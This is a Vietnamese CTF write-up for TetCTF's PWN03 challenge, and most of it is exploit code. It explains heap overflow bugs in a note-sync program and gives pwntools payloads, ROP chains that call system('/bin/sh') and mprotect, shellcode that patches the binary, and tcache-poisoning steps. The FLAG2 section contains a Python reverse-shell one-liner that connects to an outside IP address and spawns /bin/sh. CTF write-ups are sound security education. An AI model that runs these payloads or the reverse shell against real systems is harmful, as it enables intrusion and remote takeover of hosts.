# TETCTF



## PWN03-FLAG1

* Để lấy flag1 thì ở đây chúng ta phải khai thác được `interface`
* Đầu tiên ta thấy ngay là ở hàm `add_new_note` khi `malloc` cho `content` thì không khởi tạo giá trị ban đầu nên trên chunk được `malloc` sẽ vẫn còn những giá trị cũ nên có thể dùng để leak



```cpp=
if(tmp->note_content){
			free(tmp->note_content);
		}
		tmp->note_content = malloc(content_len);
		tmp->note_content_len = content_len;
		fgets(tmp->note_content, content_len, stdin);
		tmp->note_synced = 0;
```

* Bug tiếp theo ở hàm `note_sync`

```cpp=
Note_t new_note = Note_init(serialize_p->note_title, serialize_p->note_author,serialize_p->note_content_len, serialize_p->note_is_encrypt);

read_count += sizeof(struct NoteSerialize);
Note_t p_note;
DL_SEARCH(notes, search_note, new_note, Note_cmp);
p_note = search_note;
if(!search_note){
	p_note = new_note;
	}

				// update new content
if(!p_note->note_is_encrypt){
		memcpy(p_note->note_content, serialize_p->content, serialize_p->note_content_len);
		read_count += new_note->note_content_len;
				}

```

* Khi mà có `1` note trên `backend` có cùng `title` và `author` thì chương trình sẽ sao chép `content` ở note trên `backend` vào `content` ở `note` trên `interface`. Ở đây ta thấy nó không check bound trước khi copy và vì `note` trên `interface` có thể không đồng bộ với trên `backend` khi ta dùng hàm `edit_note` nếu `note` không có `is_encrypt` bit thì sẽ chỉ thay đổi trên `interface` do vậy ta có `BOF` ở đây
* Đầu tiên thì mình sẽ leak `stack`. Dùng `heap overflow` để overwrite `1` note trên `interface`, thay đổi field `content`

```py=
payload = b'A'*0x10
payload += p64(0) + p64(0x91)
payload += p64(0x62) + p64(0)*7
payload += p64(0x62) + p64(0)*3
payload += p64(0x10) + p64(0) + p64(libc.symbols['environ']) + p64(heap + 0x370)
payload += p64(0) + p64(0x21)
payload += p64(libc.address + 0x21ace0)*2
payload += p64(0) + p64(0x91)
payload += p64(0x61) + p64(0)*7
payload += p64(0x61) + p64(0)*3
payload += p64(0x200) + p64(0)*4 + p64(0xf1)
payload += p64(libc.address + 0x21ace0)*2
payload = payload.ljust(0x200, b'\x00')
new_note(b'a', b'a', 0x200, payload)
note_sync('c')
edit_note(b'a', b'a', 1, b'a')
new_note(b'b', b'b', 1, b'hehe')
note_sync('s')
```

* Ở đây mình thay đổi `content` thành `environ`
* Sau đó lại sử dụng bug này để rop
* Overwrite `content` của `1` note thành `saved rip` của `note_sync`, khi `note_sync` chạy đến `memcpy` của note đó rồi thì ta được ropchain

```py=
ayload += p64(0) + p64(0x21) + b'A'*0x10 + p64(0) + p64(0x91)
payload += p64(0x62) + p64(0)*7 + p64(0x62) + p64(0)*3 + p64(0x10) + p64(0)
payload += p64(stack)
payload += p64(heap + 0x630) + p64(0) + p64(0x21)
payload += p64(libc.address + 0x21ace0)*2
payload += p64(0) + p64(0x91)
payload += p64(0x61) + p64(0)*7
payload += p64(0x61) + p64(0)*3
payload += p64(0x200) + p64(0) + p64(heap + 0x400)  + p64(heap + 0x770)*2 + p64(0x91)
payload += p64(0x62) + p64(0)*7
payload += p64(0x62) + p64(0)*3
payload += p64(0x50) + p64(0x2)
payload += p64(stack - 0x338) + p64(heap + 0x6e0) + p64(0) + p64(0x61)
payload += p64(0xdeadbeef)
print('len: ', hex(len(payload)))

payload2 = b'hihi'
RET = 0x00000000000baaf9 + libc.address#: xor rax, rax ; ret

rop = ROP(libc)
#rop.raw(RET)
rop.system(next(libc.search(b'/bin/sh\x00')))
#rop.read(0, stack - 0x338, 0x500)

payload2 = rop.chain()
delete_note(b'a', b'a')
delete_note(b'b', b'b')
new_note(b'a', b'a', 0x400, payload)
new_note(b'b', b'b', 0x50, payload2)
note_sync('c')
edit_note(b'a', b'a', 0x200, b'a')
note_sync('s')
```

![Screenshot 2024-01-29 143130](https://hackmd.io/_uploads/rkd1kkHc6.png)


## PWN03-FLAG2

* Để lấy dc `flag2` thì chúng ta phải dùng `backend` để đọc flag nên ở đây mình sẽ khai thác `backend`
* Có `1` bug ở trên `backend` khi tạo `1` note với flag `is_encrypt` với content ko quá bé thì sau khi `backend` encrypt thì chunk chứa cipher text sẽ bị overwrite size của chunk trước đó. Mình ko khai thác được lỗi này
* Tiếp đến ở `option` `FETCH` khi fetch all tức `note_sync('s')` trên `interface`


```cpp=
DL_FOREACH_SAFE(cur_note, tmp1, etmp)
{
	tmp_size = sizeof(struct NoteSerialize);
	if (!tmp1->note_is_encrypt)
	{
		tmp_size += tmp1->note_content_len;
	}
	if (reply_size + tmp_size > SHM_MEM_MAX_SIZE)
	{
		DBG("[backend] reply_size(%d) is larger than SHM_MEM_MAX_SIZE, enable truncated mode\n", reply_size + tmp_size);
		truncated = 1;
		tmp_note2 = tmp1;
		break;
	}
	reply_size += tmp_size;
}
```

* Khi mà `reply_size + tmp_size > SHM_MEM_MAX_SIZE(0x10000)` thì chương trình sẽ dừng và không tăng `reply_msg` nhưng khi tạo `msg` gửi cho `interface` thì duyệt không xót note nào. Vậy chẳng hạn ta có `2` note với `content_len` là `0x400` và `0xfff0` nó sẽ xét tới note `2` cộng thêm `0xfff0` vào thì sẽ không tăng `reply_size` nữa nên `reply_size` ở đây vẫn sẽ tầm `0x4..`(cộng thêm `sizeof(struct NoteCommon)`) nên ở đây ta lại có `heap overflow`

```cpp=
DL_FOREACH_SAFE(cur_note, tmp1, etmp)
{
	serialize_p = (NoteSerialize_t)((size_t)reply_msg->msg_content + written_count);

	memcpy(&(serialize_p->common), &(tmp1->common), sizeof(struct NoteCommon));
	written_count += sizeof(struct NoteSerialize);
	DBG("[backend] FETCH: serialize note %s(%s)\n", serialize_p->note_title, serialize_p->note_author);
	if (!tmp1->note_is_encrypt)
	{
		written_count += tmp1->note_content_len;
		memcpy(serialize_p->content, tmp1->note_content, tmp1->note_content_len);
	}
}
```

* Ở `interface` ban đầu ta không thể tạo `content` chunk quá lớn

```cpp=
printf("How many bytes for content? ");
	content_len = read_int();
	if(content_len > MAX_CONTENT_LEN){
		content_len = MAX_CONTENT_LEN;
	}
```

* `MAX_CONTENT_LEN` ở đây là `0x1000`. Cách giải quyết ở đây là dựa trên việc ropchain ở phần trước mình `mprotect` `interface` để sửa lại cách hoạt động của hàm cho cái check size đó trở lên rất lớn
* Vậy thì giờ việc còn lại là xây dựng heap trên `backend` sao cho bug `heap overflow` vừa hay chỉ overwrite `1` byte của field `content` của `1` note và hạn chế phá heap
* Payload của mình nối tiếp ở `flag1`

```py=
delete_note(b'a', b'a')
delete_note(b'b', b'b')

payload = p64(0x61) + p64(0)*7
payload += p64(0x61) + p64(0)*3
payload += p64(0x390) + p64(0)*8
new_note(b'a', b'a', 0xf910, b'a')
note_sync('c')
new_note(b'nao', b'nao', 0x600, b'nao')
note_sync('c')
new_note(b'b', b'b', 0xfff0, b'b')
note_sync('c')
payload = p32(0) + p64(0x100) + p64(0)*5 + b'\x00'
new_note(b'c'*0x8 + p64(0xb1), b'c'*0x18, 53, payload)
note_sync('c')
delete_note(b'b', b'b')
```
 
 ![Screenshot 2024-01-29 144844](https://hackmd.io/_uploads/ryTsuRVcp.png)

* Ban đầu

![Screenshot 2024-01-29 144903](https://hackmd.io/_uploads/B1WauRVqp.png)

* Sau đó

![Screenshot 2024-01-29 144922](https://hackmd.io/_uploads/rkkAdA4qT.png)

* Như vậy là ta có thể đưa heap kia vào `content` của `1` note trên `interface` nhưng vì `NULL` byte nên mình ko thể dùng `option` `List Note` để đọc
* Dựa vào ropchain ban đầu mình sửa luôn hàm `Read_note` thành arbitrary read luôn

```py=
new_read_note = 'sub rsp, 0x80\n'
new_read_note += shellcraft.read(0, interface.symbols['notes'] + 8, 8)
new_read_note += '\n mov rsi, [rsi]\n'
new_read_note += shellcraft.write(1, 'rsi', 0x100)
new_read_note += '\nadd rsp, 0x80'
new_read_note += '  \nret'
```

* Patch lại `interface`

```py=
rop_elf.raw(interface.symbols['note_main'] + 122)
rop_libc.mprotect(interface.address + 0x2000, 0x3000, 7)
rop_libc.rsi = interface.symbols['edit_note'] + 525
rop_libc.rdi = 0x0fc5390001ffffb8
rop_libc.raw(MOV_PRSI_RDI)
rop_libc.rsi = interface.symbols['add_new_note'] + 621
rop_libc.rdi = 0xc439410001ffffb8
rop_libc.raw(MOV_PRSI_RDI)
rop_libc.rsi = interface.symbols['add_new_note'] + 254
rop_libc.rdi = 0x0fd0390001ffffba
rop_libc.raw(MOV_PRSI_RDI)
rop_libc.read(0, interface.symbols['read_note'], 0x200)
rop_libc.raw(RET)

payload += rop_libc.chain() + rop_elf.chain()
```

* Đoạn tiếp sau đây của mình chỉ hoạt động trên local còn khi chạy trên server thì sau khi leak được heap của `backend` thì hình như `backend` crash nên không thể kết nối được nữa
* Tiếp theo dựa vào `heap overflow` thì mình overwrite được tcache cho trỏ về `1` note hiện tại để mình có thể sửa `content` tùy ý mà leak. Đoạn này rất mệt vì nó phá heap với struct nhiều làm mãi mới xây dựng được `1` cái payload chạy dc(mình đọc lại cũng chẳng hiểu gì)

![Screenshot 2024-01-29 145941](https://hackmd.io/_uploads/H1JWo0E9T.png)

* Như ta thấy `next_note` và `content` đều trỏ cùng `1` chunk nên mình thay đổi `content` để leak `libc` và `stack`
* Sau thì mình fake tcache lần nữa nma giờ không thể làm được `heap overflow` với cái kiểu `reply_msg + tmp_size > 0x10000` heap giờ nát quá rồi không chạy được cái đó nữa thì ở đây do có thể control được hoàn toàn `1` note mình thay đổi control vì mình có thể `arbitrary free` `1` chunk bất kì. Mình chỉ cần tìm trước `1` cái tcache chunk nào đó có `1` số data mà mình kiểm soát từ trước đó rồi craft fake chunk 

![Screenshot 2024-01-29 150545](https://hackmd.io/_uploads/HkQOnA49a.png)

![Screenshot 2024-01-29 150553](https://hackmd.io/_uploads/rJu_3R4qT.png)

* Lúc đầu cái `aa...` kia là `1` cái string khác mà mình biết ngay là tên của `1` note mình tạo nên mình biết là mình control được rồi mình set `0x151` ở kia thôi

```py=
new_note(b'a'*8 + p32(0x151), b'fake', 0xc0, fake_chunk)
```

* `free` rồi `malloc` chunk vừa rồi để overwrite tcache thành `saved rip - 0x10` của `memcpy` rồi tạo reverse shell do mình không thể interact trực tiếp với `backend`

```py=
PYTHON3 = env_back - 0x298 - 8 - 0x10 + 0xa0
C = PYTHON3 + 1 + len('/bin/python3')
REVERSE_ADDR = C + 1 + len('-c')
REVERSE = b'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("193.161.193.99",26863));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
back_rop = ROP(libc_back)
flag = b'/home/nao/flag\x00r\x00'.ljust(0x18, b'\x00')
back_rop.raw(0)
back_rop.raw(0)
back_rop.raw(0)
back_rop.execve(PYTHON3, PYTHON3 - 0x40, 0)
payload = back_rop.chain()

payload = payload.ljust(0xa0 - 0x40, b'\x00')
payload += p64(PYTHON3)
payload += p64(C)
payload += p64(REVERSE_ADDR)
payload += p64(0)*5
payload += b'/bin/python3\x00' + b'-c\x00' + REVERSE + b'\x00'

```

![Screenshot 2024-01-29 151209](https://hackmd.io/_uploads/SJYxCRN9a.png)

![Screenshot 2024-01-29 151224](https://hackmd.io/_uploads/ryv-R0N5a.png)

* Tiếc là trên server chạy ko ăn:((

* Chạy dc trên server sau 10ph đợi script

![Screenshot 2024-01-30 195938](https://hackmd.io/_uploads/rJZ_mOLca.png)

